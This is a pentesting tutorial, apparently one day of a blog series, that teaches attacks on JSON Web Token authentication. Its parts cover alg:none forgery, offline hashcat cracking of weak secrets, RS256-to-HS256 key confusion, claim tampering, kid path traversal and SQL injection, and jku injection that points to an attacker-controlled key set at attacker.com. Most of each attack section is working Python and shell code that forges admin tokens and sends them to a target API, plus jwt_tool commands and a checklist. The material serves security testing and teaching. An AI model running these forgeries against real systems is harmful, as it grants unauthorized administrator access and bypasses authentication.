# JWT Attack Playbook: Cracking Tokens, Forging Claims & Bypassing Auth

> **Series:** 30-Day API Pentesting | **Day 17** | Week 3: Tools & Techniques  
> **Difficulty:** Beginner → Intermediate  
> **Topic:** JWT Attacks — alg:none, RS256→HS256, Weak Secrets, Header Injection

---

## What is a JWT and Why Does It Matter for Hackers?

**JWT (JSON Web Token)** is the most common way modern APIs handle authentication. After you log in, the server gives you a JWT. You include this token in every API request, and the server trusts whoever holds it.

The problem? JWTs are designed to be **self-contained** — the server doesn't store them. Instead, it **verifies** them using a signature. If that verification has any weakness, you can forge a token claiming to be any user, with any role, without knowing the password.

This is why JWT vulnerabilities are so high-impact: **forge the token = become admin**.

---

## Part 1: Understanding JWT Structure

Before you attack anything, you must understand what you're working with.

A JWT looks like this:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

It has **three parts** separated by dots (`.`):

```
PART 1 (Header)   . PART 2 (Payload)   . PART 3 (Signature)
eyJhbGci...         eyJ1c2VySWQ...       SflKxwRJ...
```

Each part is **base64url encoded** (not encrypted — just encoded). You can decode them instantly.

### Decoding a JWT

```bash
# Method 1: Use jwt.io in browser (easiest)
# Paste the token at https://jwt.io → see all three parts decoded

# Method 2: Command line
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SflK..."

# Decode header (part 1)
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null
# Output: {"alg":"HS256","typ":"JWT"}

# Decode payload (part 2)
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null
# Output: {"userId":1,"role":"user","exp":1700000000,"iat":1699996400}
```

### Understanding the Parts

**Header** — tells the server HOW to verify the signature:
```json
{
  "alg": "HS256",    ← algorithm (HS256, RS256, ES256, none...)
  "typ": "JWT"       ← token type
}
```

**Payload** — the actual data (claims). This is what you want to modify:
```json
{
  "userId": 1,           ← user identifier
  "role": "user",        ← role (you want to change this to "admin")
  "email": "john@x.com",
  "exp": 1700000000,     ← expiry timestamp (Unix epoch)
  "iat": 1699996400,     ← issued at timestamp
  "iss": "api.target.com" ← issuer
}
```

**Signature** — cryptographic proof that the header + payload weren't tampered with:
```
HMAC_SHA256(base64(header) + "." + base64(payload), secret_key)
```

The whole security model rests on one thing: **the secret key**. If you can get around the signature verification, you can put anything you want in the payload.

---

## Attack 1: alg:none Bypass

### Why This Works

The JWT spec says `alg:none` is a valid algorithm meaning "no signature required." Some servers implement this without thinking about the security implications — if the header says `none`, they skip signature verification entirely.

### Step-by-Step Attack

```python
import base64
import json

# Step 1: Get your current JWT token from the app
original_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SflK..."

# Step 2: Decode the payload
parts = original_token.split('.')
# Add padding to base64 if needed
payload_encoded = parts[1] + '=' * (4 - len(parts[1]) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_encoded))
print("Original payload:", payload)
# {'userId': 1, 'role': 'user', 'exp': 1700000000}

# Step 3: Modify the payload — escalate to admin
payload['role'] = 'admin'
payload['userId'] = 1
payload['exp'] = 9999999999  # year 2286 — won't expire

# Step 4: Create new header with alg:none
new_header = {"alg": "none", "typ": "JWT"}

# Step 5: Encode both parts (base64url, no padding)
def b64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

encoded_header  = b64url_encode(new_header)
encoded_payload = b64url_encode(payload)

# Step 6: Build forged token with EMPTY signature
forged_token = f"{encoded_header}.{encoded_payload}."
#                                                    ↑ empty — no signature!

print("\nForged token:")
print(forged_token)

# Step 7: Test it
import requests
resp = requests.get(
    "https://api.target.com/api/v1/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(f"\nResponse: {resp.status_code}")
if resp.status_code == 200:
    print("VULNERABLE! alg:none bypass worked!")
    print(resp.json())
```

### Quick Manual Method

```bash
# Manual alg:none in one command:
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"userId":1,"role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')
FORGED="$HEADER.$PAYLOAD."

echo "Forged token: $FORGED"

curl https://api.target.com/api/v1/admin \
     -H "Authorization: Bearer $FORGED"
```

---

## Attack 2: Weak Secret Brute Force

### Why This Works

If the server uses **HS256** (HMAC-SHA256), the same secret key is used to both **sign** and **verify** the token. If the secret is weak (like `secret`, `password`, `123456`), an attacker can brute force it offline using the captured token.

**Key point:** You don't need to interact with the server to crack the secret. You just need the JWT. The cracking happens entirely offline.

### Cracking with hashcat

```bash
# Save your JWT token to a file (the complete token, all three parts)
echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2Q" > jwt.txt

# Crack with hashcat (mode 16500 = JWT/JWS)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Success output looks like:
# eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEsIn...:password
#                                               ↑ the secret!
```

### Common Weak Secrets to Try First

```bash
# Before running hashcat on large wordlists, try these manually:
SECRETS=("secret" "password" "123456" "jwt_secret" "api_secret" "app_secret"
         "mysecret" "your-secret-key" "your-256-bit-secret" "supersecret"
         "jwt" "token" "key" "private" "changeme" "admin" "test" "dev")

TOKEN="eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjF9.SflKxwRJ..."

for secret in "${SECRETS[@]}"; do
    # Verify signature manually
    result=$(python3 -c "
import jwt
try:
    payload = jwt.decode('$TOKEN', '$secret', algorithms=['HS256'])
    print('FOUND:', '$secret')
except:
    pass
" 2>/dev/null)
    [ -n "$result" ] && echo "$result" && break
done
```

### Forging a Token After Cracking the Secret

```python
import jwt  # pip install PyJWT

cracked_secret = "password"  # what hashcat found

# Forge admin token with real signature
payload = {
    "userId": 1,
    "role": "admin",
    "email": "admin@target.com",
    "exp": 9999999999  # far future
}

forged_token = jwt.encode(payload, cracked_secret, algorithm="HS256")
print("Forged admin token:", forged_token)

# Use it:
import requests
resp = requests.get(
    "https://api.target.com/api/v1/admin/users",
    headers={"Authorization": f"Bearer {forged_token}"}
)
print(resp.status_code, resp.json())
```

---

## Attack 3: RS256 → HS256 Algorithm Confusion

### Why This Works (Important Concept)

**RS256** uses two keys:
- **Private key** → used to SIGN the token (only the server has this)
- **Public key** → used to VERIFY the token (anyone can have this)

**HS256** uses ONE key for both signing and verifying.

The confusion attack works like this:
1. The server normally uses RS256
2. But the server's JWT library **also accepts** HS256
3. The public key is available (from `/jwks.json`)
4. You re-sign a forged token using **HS256** with the **public key** as the HMAC secret
5. The server tries to verify an HS256 token using its "public key" — which happens to be what you used to sign
6. Signature matches → server accepts your forged token!

```
Normal RS256:
  Server signs with PRIVATE key → you verify with PUBLIC key ✓

Confusion attack:
  You sign with PUBLIC key (using HS256)
  Server verifies with PUBLIC key (thinking it's verifying HS256)
  → Match! Server is fooled.
```

### Step-by-Step Attack

```bash
# Step 1: Get the public key
curl https://target.com/.well-known/jwks.json
curl https://target.com/jwks.json
curl https://target.com/api/.well-known/jwks.json

# Response looks like:
# {"keys":[{"kty":"RSA","n":"0vx7agoebGc...","e":"AQAB","kid":"key1"}]}

# Step 2: Convert JWKS to PEM format
python3 << 'EOF'
import json, base64
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

jwks = json.loads(open('jwks.json').read())
key = jwks['keys'][0]

# Decode n and e from base64url
n = int.from_bytes(base64.urlsafe_b64decode(key['n'] + '=='), 'big')
e = int.from_bytes(base64.urlsafe_b64decode(key['e'] + '=='), 'big')

pub_key = RSAPublicNumbers(e, n).public_key()
pem = pub_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
EOF
# Save output as public_key.pem
```

```python
# Step 3: Forge token using HS256 with public key as secret
import jwt

# Read the public key
with open('public_key.pem', 'rb') as f:
    public_key = f.read()

# Forge admin payload
payload = {
    "userId": 1,
    "role": "admin",
    "exp": 9999999999
}

# Sign with HS256 using public key as the HMAC secret
# This is the confusion: using RSA public key as HMAC symmetric key
forged = jwt.encode(
    payload,
    public_key,        # ← public key used as HMAC secret
    algorithm="HS256"  # ← switched from RS256 to HS256
)

print("Forged token:", forged)

# Test it
import requests
resp = requests.get(
    "https://api.target.com/api/v1/admin",
    headers={"Authorization": f"Bearer {forged}"}
)
print(f"Status: {resp.status_code}")
if resp.status_code == 200:
    print("RS256→HS256 confusion worked!")
```

---

## Attack 4: Claim Manipulation

### Testing What Claims the Server Validates

```python
import jwt, base64, json

original_token = "YOUR_TOKEN_HERE"
parts = original_token.split('.')

def decode_part(part):
    padded = part + '=' * (4 - len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))

payload = decode_part(parts[1])
print("Original claims:", json.dumps(payload, indent=2))

# Claims to test:
# 1. exp — does server reject expired tokens?
# 2. iss — does server validate the issuer?
# 3. aud — does server validate the audience?
# 4. role — can you escalate by changing this?
```

```bash
# Test 1: Expired token still accepted?
# Change exp to timestamp in the past
python3 -c "
import jwt, base64, json

token = 'YOUR_TOKEN'
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
payload['exp'] = 1000000000  # September 2001 — definitely expired

# Rebuild with original signature (server may still accept if exp not checked)
new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
test_token = parts[0] + '.' + new_p + '.' + parts[2]
print(test_token)
"
# Send this token — if 200 OK → exp not validated!

# Test 2: Remove exp entirely
python3 -c "
import jwt, base64, json
token = 'YOUR_TOKEN'
parts = token.split('.')
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
del payload['exp']  # remove expiry completely
new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(parts[0] + '.' + new_p + '.' + parts[2])
"
```

---

## Attack 5: JWT Header Injection (kid/jku/x5u)

### kid (Key ID) Injection

The `kid` header tells the server WHICH key to use to verify the token. Some servers use the `kid` value in a database query or file path — which means SQL injection or path traversal!

```python
import jwt, json

# kid path traversal — point to /dev/null (empty file = empty key = sign with empty string)
malicious_header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "../../../../../../dev/null"  # path traversal
}

payload = {"userId": 1, "role": "admin", "exp": 9999999999}

# Sign with empty string (since /dev/null is empty)
forged = jwt.encode(
    payload,
    "",           # empty secret (because kid points to /dev/null)
    algorithm="HS256",
    headers=malicious_header
)
print("kid injection token:", forged)

# Also try SQL injection in kid:
# "kid": "x' UNION SELECT 'mysecret' --"
# Then sign with "mysecret" — if server uses kid in SQL query!
```

### jku (JWK Set URL) Injection

```python
# jku tells the server WHERE to fetch the public key
# If you can point it to YOUR server, the server will use YOUR public key to verify

# Step 1: Generate your own RSA key pair
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# Step 2: Create JWKS endpoint on your server (attacker.com/jwks.json)
# Host this JSON:
# {"keys":[{"kty":"RSA","n":"YOUR_N","e":"AQAB","kid":"attacker-key-1"}]}

# Step 3: Sign token with YOUR private key, pointing jku to YOUR server
malicious_header = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://attacker.com/jwks.json",  # ← your server!
    "kid": "attacker-key-1"
}

payload = {"userId": 1, "role": "admin", "exp": 9999999999}

# Sign with YOUR private key
from cryptography.hazmat.primitives import serialization
private_pem = private_key.private_bytes(
    serialization.Encoding.PEM,
    serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption()
)

forged = jwt.encode(payload, private_pem, algorithm="RS256", headers=malicious_header)
# Server fetches YOUR jwks.json → verifies with YOUR public key → accepts!
print("jku injection token:", forged)
```

---

## Using jwt_tool — The All-in-One JWT Attack Tool

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Basic usage — show token info
python3 jwt_tool.py YOUR_TOKEN

# Test all known attacks automatically
python3 jwt_tool.py YOUR_TOKEN -M at

# Specific attack — alg:none
python3 jwt_tool.py YOUR_TOKEN -X a

# Crack weak secret
python3 jwt_tool.py YOUR_TOKEN -C -d wordlist.txt

# Tamper payload and resign with cracked secret
python3 jwt_tool.py YOUR_TOKEN -S hs256 -p "password" -I -pc role -pv admin

# RS256 to HS256 confusion
python3 jwt_tool.py YOUR_TOKEN -X k -pk public_key.pem

# jku injection
python3 jwt_tool.py YOUR_TOKEN -X j -ju "https://attacker.com/jwks.json"

# kid injection (path traversal)
python3 jwt_tool.py YOUR_TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

---

## Complete Attack Methodology

```bash
# When you find a JWT on a target, follow this order:

STEP 1: Decode and read the token
  → jwt.io OR: echo $TOKEN | cut -d'.' -f2 | base64 -d

STEP 2: Note the algorithm (alg field in header)
  → HS256: try alg:none AND brute force secret
  → RS256: try alg:none AND RS256→HS256 confusion
  → None: already vulnerable!

STEP 3: Try alg:none (fastest, most impactful)
  → Change header to {"alg":"none"} + change role to admin + strip sig

STEP 4: Try brute force (if HS256)
  → hashcat -m 16500 token.txt rockyou.txt

STEP 5: Check /jwks.json (if RS256)
  → Download public key → try HS256 confusion attack

STEP 6: Test claim validation
  → Expired token accepted? → missing exp check
  → Can you change role in payload and same sig works? → no integrity check

STEP 7: Check JWT header fields
  → Has kid? → try path traversal: ../../dev/null
  → Has jku/x5u? → try URL injection pointing to your server
```

---

## Checklist

```
☐  Decode every JWT → jwt.io → read alg, role, exp, iss, aud
☐  Try alg:none → always the fastest test → change header, strip sig
☐  Brute weak secret → hashcat -m 16500 token.txt rockyou.txt
☐  Check /jwks.json → public key exposed? Try RS256→HS256 confusion
☐  Test expired tokens → send exp:1000000 → still accepted? bug!
☐  Test claim manipulation → change role, userId, email in payload
☐  Check kid/jku headers → JWT has these? Try injection attacks
☐  Use jwt_tool -M at → runs all attacks automatically
```

---

*Written by @anand87794*  
*30-Day API Pentesting Series — Day 17 of 30*
